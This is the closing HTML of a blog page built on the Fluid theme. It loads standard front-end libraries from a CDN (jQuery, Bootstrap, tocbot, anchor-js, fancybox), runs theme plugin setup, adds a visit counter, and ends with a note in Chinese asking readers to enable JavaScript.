  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
